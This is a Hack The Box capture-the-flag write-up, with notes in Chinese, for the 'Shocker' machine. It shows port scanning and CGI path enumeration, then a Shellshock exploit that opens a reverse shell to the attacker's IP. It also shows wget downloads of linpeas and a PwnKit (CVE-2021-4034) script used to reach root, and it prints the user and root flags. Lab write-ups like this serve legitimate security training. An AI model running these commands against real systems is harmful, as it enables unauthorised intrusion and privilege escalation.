###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Shocker
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.38.229 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.38.229:80
Open 10.129.38.229:2222

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

掃路徑，偷看了一下提示發現要找`.cgi` `.sh` `.pl`
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.38.229/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/common.txt 

cgi-bin/                [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 282ms]
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 282ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 283ms]

┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://10.129.38.229/cgi-bin/ -w /home/kali/SecLists/Discovery/Web-Content/common.txt -x cgi,sh,pl

/user.sh              (Status: 200) [Size: 119]
```

搜尋`Apache httpd 2.4.18 cgi-bin exploit`可找到[CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

用它可得reverse，在`/home/shelly`得user.txt
```
┌──(kali㉿kali)-[~/htb/CVE-2014-6271]
└─$ python3 shellshock_exploit.py http://10.129.38.229/cgi-bin/user.sh 10.10.14.55 4444

shelly@Shocker:/home/shelly$ cat user.txt
ec6030bbfc279f8590b53d7a3d9ece0a
```

用`linpeas.sh`
```
shelly@Shocker:/tmp$ wget 10.10.14.55/linpeas.sh
shelly@Shocker:/tmp$ chmod +x linpeas.sh
shelly@Shocker:/tmp$ ./linpeas.sh
```

用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root之後，在/root得root.txt
```
shelly@Shocker:/tmp$ wget 10.10.14.55/CVE-2021-4034.py
shelly@Shocker:/tmp$ python3 CVE-2021-4034.py
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Shocker:/root# cat root.txt
37ebb9714f4a1f953fc347f8b485d1d7
```
